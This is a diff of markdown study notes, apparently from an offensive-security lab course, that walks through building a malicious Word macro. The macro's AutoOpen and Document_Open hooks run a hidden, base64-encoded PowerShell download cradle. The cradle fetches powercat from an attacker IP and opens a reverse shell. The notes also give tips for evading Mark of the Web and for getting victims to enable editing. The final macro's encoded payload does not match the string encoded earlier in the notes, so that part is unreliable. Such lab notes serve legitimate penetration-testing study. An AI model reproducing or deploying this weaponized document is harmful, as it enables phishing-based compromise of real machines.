@@ -60,8 +60,8 @@ For better chances, we should use pretexts and provide a download link, or some 
 
 If we happen to be successful in delivering an Office document over email or download link, the file will be tagged with the Mark of the Web (MOTW) and, therefore, opened in protected view, which disables all editing settings and blocks macro/embedded object execution. If the victim enables editing, protected view will be disabled, so the easiest way to get past this is to convince the victim to Enable Editing. A common way to do this is to blur the rest of the document and instructing them to click the button to "unlock" it.
 
-NOTE: MOTW is not added to files on FAT32-formatted devices.
-NOTE: We can avoid the MOTW flag by providing our malicious file in a 7zip, ISO, or IMG.
+*NOTE: MOTW is not added to files on FAT32-formatted devices.
+NOTE: We can avoid the MOTW flag by providing our malicious file in a 7zip, ISO, or IMG.*
 
 It is important to note that some Microsoft Office programs, like Publisher, don't have Protected View, but we are also less likely to find them installed.
 
@@ -69,7 +69,7 @@ Microsoft has blocked macros by default on most versions of PowerPoint, Word, Ex
 
 ### Installing Microsoft Office
 
-NOTE: On Windows 11, NLA is default-enabled for RDP connections, and if our target machine is not domain-joined, rdestop will not connect to it. Instead, use xfreerdp, which supported NLA for non-domain-joined machines.
+*NOTE: On Windows 11, NLA is default-enabled for RDP connections, and if our target machine is not domain-joined, rdestop will not connect to it. Instead, use xfreerdp, which supported NLA for non-domain-joined machines.*
 
 ```console
 $ xfreerdp /u:offsec /p:lab /v:192.168.195.196
@@ -79,9 +79,158 @@ $ xfreerdp /u:offsec /p:lab /v:192.168.195.196
 
 Office apps like Excel and Word allow embedded macros that are a series of commands and instructions in a group that accompish some task programatically.
 
-NOTE: We can write macros from scratch in Visual Basic for Applications (VBA) which has full access to ActiveX objects and the Windows Script Host, similar to JS in HTML apps.
+*NOTE: We can write macros from scratch in Visual Basic for Applications (VBA) which has full access to ActiveX objects and the Windows Script Host, similar to JS in HTML apps.*
 
 Let's use an embedded macro in Word for a reverse shell! 
 
-NOTE Older client-side attack vectors, like Dynamic Data Exchange (DDE) and various Object Linking and Embedding (OLE) methods will work poorly without modifying our target system significantly.
+*NOTE: Older client-side attack vectors, like Dynamic Data Exchange (DDE) and various Object Linking and Embedding (OLE) methods will work poorly without modifying our target system significantly.*
 
+Create a black Word doc names mymacro and save it as a .doc (97-2003). The .docx type cannot save macros without attached a containing template, which means we can run them but cannot save or embed them. We can, however, also try .docm.
+
+Once saved, go to the View tab and click the Macros element. Name the macro MyMacro and select the MyMacro document in the Macros in drop down menu. Click Create. You'll see the MS Visual Basic for Application window. We are provided the following template:
+
+```
+Sub MyMacro()
+'
+' MyMacro Macro
+'
+'
+
+End Sub
+```
+
+The apostrophes start comments.
+
+The sub prodecure is similar to a function. However, sub procedures cannot be used in expressions because they do not return any values.
+
+Let's leverage ActiveX Objects, which provide access to underlying OS cmds. We can do this with WScript through the Windows Script Host Shell object.
+
+```
+Sub MyMacro()
+
+    CreateObject("Wscript.Shell").Run "powershell"
+
+End Sub
+```
+
+Office macros are not executed automatically, so we need to use the pre-defined AutoOpen macro and Document_Open event, so they will be ran upon opening the doc.
+
+```
+Sub AutoOpen()
+
+  MyMacro
+  
+End Sub
+
+Sub Document_Open()
+
+  MyMacro
+  
+End Sub
+
+Sub MyMacro()
+
+  CreateObject("Wscript.Shell").Run "powershell"
+  
+End Sub
+```
+
+Click save and close the document. Re-open and observe the warning that macros were disabled. Click Enable Content. You now have a PowerShell window!
+
+Let's take it one step further and have our macro get a reverse shell with PowerCat. We'll leverage a PowerShell download cradle (base-64 encoded) to download PowerCat and start the shell. The command must be declared as a String, which *has a 255 char limit*. However, this restriction does not apply to strings stored in variables, so we an split the commands into multiple lines and concat them.
+
+Return to View > Macros > MyMacro > Edit. Add the Dim line.
+
+```
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+```
+
+We will use the followimg PS command to install PoweCat and get the shell:
+
+```powershell
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.224/powercat.ps1');powercat -c 192.168.45.224 -p 4444 -e powershell
+```
+
+To encode for POWERSHELL, use the pwsh script from Common Web Attacks or use UTF-16LE [here](https://www.base64encode.org/).
+
+Encoded:
+```
+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA0AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA0ACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwA
+```
+
+Use this Python script to split the encoded string into smaller chunks and concat them to Str.
+
+```python
+str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA0AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA0ACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwA"
+
+n = 50
+
+for i in range(0, len(str), n):
+	print("Str = Str + " + '"' + str[i:i+n] + '"')
+```
+Result:
+```
+$ python3 64split.py
+Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
+Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
+Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
+Str = Str + "GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI"
+Str = Str + "ALgAxADYAOAAuADQANQAuADIAMgA0AC8AcABvAHcAZQByAGMAY"
+Str = Str + "QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB"
+Str = Str + "jACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA0ACAALQBwA"
+Str = Str + "CAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGw"
+Str = Str + "A"
+
+```
+
+
+Update your macro with the split strings:
+
+```
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    
+    Str = Str + "powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY"
+    Str = Str + "3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5"
+    Str = Str + "nKCdodHRwOi8vMTkyLjE2OC40NS4yMjQvcG93ZXJjYXQucHMxJ"
+    Str = Str + "yk7cG93ZXJjYXQgLWMgMTkyLjE2OC40NS4yMjQgLXAgNDQ0NCA"
+    Str = Str + "tZSBwb3dlcnNoZWxs"
+
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+```
+
+Save and close the document.
+
+Start a web server **in the directory where powercat.ps1 is**:
+
+```console
+$ python3 -m http.server 80
+```
+
+Start a nc listener.
+
+```console
+$ nc -nlvp 4444
+```
+
+Success!
